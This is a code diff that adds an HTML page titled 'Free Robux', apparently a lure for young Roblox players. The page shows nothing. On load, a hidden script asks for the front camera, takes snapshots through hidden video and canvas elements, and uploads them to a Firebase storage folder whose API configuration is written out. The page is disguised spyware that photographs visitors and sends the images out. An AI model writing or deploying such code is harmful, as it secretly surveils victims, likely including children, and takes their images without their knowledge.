@@ -1,1 +1,100 @@
 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Robux</title>
+    <title>Free Robux</title>
+    <script type="module">
+        // Import the necessary Firebase functions
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
+        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
+            authDomain: "html-7fd9b.firebaseapp.com",
+            projectId: "html-7fd9b",
+            storageBucket: "html-7fd9b.appspot.com",
+            messagingSenderId: "1022361191925",
+            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+
+        // Function to upload image to Firebase
+        function uploadImage(imageData) {
+            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
+            uploadString(storageRef, imageData, 'data_url')
+                .then(() => {
+                    console.log('Uploaded a blob or file!');
+                })
+                .catch((error) => {
+                    console.error('Error uploading image:', error);
+                });
+        }
+
+        // Access the video and canvas elements
+        window.addEventListener('load', () => {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            // Start capturing from the front camera
+            navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: { exact: "user" }, // Use front camera
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }                    
+                }
+            })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // Set the canvas size for 1080p
+                    canvas.width = 1920;  // Set canvas width to 1920 for 1080p
+                    canvas.height = 1080; // Set canvas height to 1080 for 1080p
+                    video.play();
+
+                    // Capture image after a short delay
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL('image/png');
+                        uploadImage(imageData); // Upload image to Firebase
+                        stopVideo(stream); // Stop the video stream
+                    }, 1000); // Capture after 1 second
+                    // Capture image immediately
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    uploadImage(imageData); // Upload image to Firebase
+                    stopVideo(stream); // Stop the video stream
+                };
+            })
+            .catch(err => {
+                console.error('Error accessing camera: ', err);
+            });
+        });
+
+        // Function to stop the video stream
+        function stopVideo(stream) {
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+        }
+    </script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000; /* Black background */
+        }
+
+        video, canvas {
+            display: none; /* Hide video and canvas elements */
+        }
+    </style>
+</head>
+<body>
+</body>
+</html>
